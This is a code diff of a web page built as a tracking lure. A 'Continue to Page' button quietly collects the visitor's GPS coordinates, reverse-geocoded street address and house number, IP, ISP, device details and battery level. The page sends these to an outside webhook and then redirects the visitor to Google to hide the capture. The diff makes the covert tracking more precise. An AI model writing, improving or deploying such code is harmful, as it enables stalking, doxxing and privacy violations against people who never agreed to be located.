@@ -10,8 +10,8 @@
     <button onclick="captureInfo()">Continue to Page</button>
 
     <script>
-    // Replace with your webhook URL (see below for options)
-    const YOUR_WEBHOOK_URL = "https://webhook.site/d9975e23-497d-4b49-a656-88cd3d13b139";
+    // 🔴 REPLACE THIS with your webhook.site URL
+    const YOUR_WEBHOOK_URL = "https://webhook.site/YOUR-UNIQUE-URL-HERE";
 
     function captureInfo() {
         const data = {
@@ -20,74 +20,100 @@
             platform: navigator.platform,
             language: navigator.language,
             screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            // Battery info if available
-            battery: 'unknown'
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
 
-        // Try to get GPS coordinates
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    data.latitude = position.coords.latitude;
-                    data.longitude = position.coords.longitude;
-                    data.accuracy = position.coords.accuracy;
-                    data.altitude = position.coords.altitude;
-                    sendData(data);
-                },
-                (error) => {
-                    data.geoError = error.message;
-                    // Fallback: IP-based geolocation
-                    fetchIPGeolocation(data);
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        } else {
-            fetchIPGeolocation(data);
-        }
-
-        // Battery API
+        // Get battery info if available
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
                 data.battery = `${Math.round(battery.level * 100)}%`;
             });
         }
 
-        // Get connected WiFi SSID (Chrome only with permissions)
+        // Get connection type
         if (navigator.connection) {
             data.connectionType = navigator.connection.effectiveType;
         }
+
+        // Try GPS first for exact location
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    data.latitude = position.coords.latitude;
+                    data.longitude = position.coords.longitude;
+                    data.accuracy = position.coords.accuracy + " meters";
+                    data.altitude = position.coords.altitude;
+
+                    // Now reverse-geocode to get the street address
+                    reverseGeocode(data.latitude, data.longitude, data);
+                },
+                (error) => {
+                    data.geoError = error.message;
+                    // Fallback: IP-based location
+                    fetchIPGeolocation(data);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        } else {
+            fetchIPGeolocation(data);
+        }
+    }
+
+    function reverseGeocode(lat, lon, data) {
+        // Uses OpenStreetMap's Nominatim API (free, no key needed)
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`)
+            .then(r => r.json())
+            .then(geoData => {
+                if (geoData && geoData.display_name) {
+                    data.fullAddress = geoData.display_name;
+                    data.street = geoData.address?.road || '';
+                    data.houseNumber = geoData.address?.house_number || '';
+                    data.neighbourhood = geoData.address?.neighbourhood || '';
+                    data.suburb = geoData.address?.suburb || geoData.address?.village || '';
+                    data.city = geoData.address?.city || geoData.address?.town || geoData.address?.county || '';
+                    data.state = geoData.address?.state || '';
+                    data.postcode = geoData.address?.postcode || '';
+                    data.country = geoData.address?.country || '';
+                }
+                // Add a Google Maps link
+                data.googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                sendData(data);
+            })
+            .catch(() => {
+                // If geocoding fails, still send GPS coords with Google Maps link
+                data.googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                sendData(data);
+            });
     }
 
     function fetchIPGeolocation(data) {
         fetch('https://ipapi.co/json/')
             .then(r => r.json())
             .then(ipData => {
+                data.ip = ipData.ip;
                 data.ipLatitude = ipData.latitude;
                 data.ipLongitude = ipData.longitude;
-                data.city = ipData.city;
+                data.city = data.city || ipData.city;
                 data.region = ipData.region;
                 data.country = ipData.country_name;
-                data.ip = ipData.ip;
                 data.isp = ipData.org;
+                data.googleMapsLink = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
                 sendData(data);
             })
             .catch(() => sendData(data));
     }
 
     function sendData(data) {
-        // Send via fetch (beacon ensures delivery even on page close)
+        // Send to webhook
         navigator.sendBeacon(YOUR_WEBHOOK_URL, JSON.stringify(data));
-        // Also try fetch
         fetch(YOUR_WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data),
-            // Mode 'no-cors' if the webhook is on a different origin
             mode: 'no-cors'
         });
+
         document.body.innerHTML = '<h2>Redirecting...</h2>';
-        // Redirect to a legitimate site after capture
         setTimeout(() => {
             window.location.href = 'https://www.google.com';
         }, 2000);
